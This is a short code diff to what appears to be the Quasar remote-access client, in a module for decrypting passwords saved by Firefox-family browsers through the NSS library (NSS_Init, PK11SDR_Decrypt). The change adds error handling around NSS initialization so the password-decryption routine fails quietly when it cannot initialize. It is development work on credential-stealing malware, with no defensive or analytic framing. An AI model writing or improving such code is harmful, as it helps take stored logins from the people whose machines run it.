@@ -59,7 +59,16 @@ namespace Quasar.Client.Kematian.Browsers.Gecko.Passwords
             NSS_Init = (NssInit)Marshal.GetDelegateForFunctionPointer(initProc, typeof(NssInit));
             PK11SDR_Decrypt = (Pk11sdrDecrypt)Marshal.GetDelegateForFunctionPointer(decryptProc, typeof(Pk11sdrDecrypt));
             NSS_Shutdown = (NssShutdown)Marshal.GetDelegateForFunctionPointer(shutdownProc, typeof(NssShutdown));
-            return NSS_Init(configDirectory);
+            long result = -1;
+            try
+            {
+                result = NSS_Init(configDirectory);
+            }
+            catch (Exception)
+            {
+                return -1;
+            }
+            return result;
         }
 
         public string Decrypt(string cypherText)
